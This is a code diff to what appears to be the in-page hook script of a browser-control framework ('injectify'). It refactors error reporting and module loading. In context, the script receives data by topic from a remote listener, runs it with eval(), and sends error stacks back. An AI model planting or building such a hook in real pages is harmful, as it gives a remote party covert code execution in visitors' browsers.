@@ -35,7 +35,7 @@ window['injectify'] = /** @class */ (function () {
             catch (e) {
                 if (_this.debug)
                     throw e;
-                _this.send('e', e.stack);
+                _this.error(e.stack);
             }
         };
     };
@@ -90,7 +90,7 @@ window['injectify'] = /** @class */ (function () {
         catch (e) {
             if (this.debug)
                 throw e;
-            this.send('e', e.stack);
+            this.error(e.stack);
         }
     };
     /**
@@ -185,6 +185,13 @@ window['injectify'] = /** @class */ (function () {
         enumerable: true,
         configurable: true
     });
+    /**
+     * Error handler
+     * @param {error} error The error to be handled
+     */
+    Injectify.error = function (error) {
+        this.send('e', error);
+    };
     return Injectify;
 }());
 /**
@@ -203,13 +210,19 @@ window['injectify'].listener(function (data, topic) {
             return;
         }
         if (/^module:/.test(topic)) {
-            var Module = topic.substring(7), callback = window["callbackFor" + Module];
+            var module = {
+                name: topic.substring(7),
+                callback: window["callbackFor" + topic.substring(7)],
+                returned: undefined,
+                config: {
+                    async: false
+                }
+            };
             eval(data);
-            if (data !== false && typeof callback == 'function') {
-                // @ts-ignore: module is declared outside script
-                callback(module.returned);
+            if (!module.config.async && data !== false && typeof module.callback == 'function') {
+                module.callback(module.returned);
             }
-            delete window["callbackFor" + Module];
+            delete window["callbackFor" + module.name];
             return;
         }
         if (topic == 'execute' || topic == 'core') {
@@ -222,7 +235,7 @@ window['injectify'].listener(function (data, topic) {
             //console.log(data)
             throw e;
         }
-        window['injectify'].send('e', e.stack);
+        window['injectify'].error(e.stack);
     }
 });
 /**
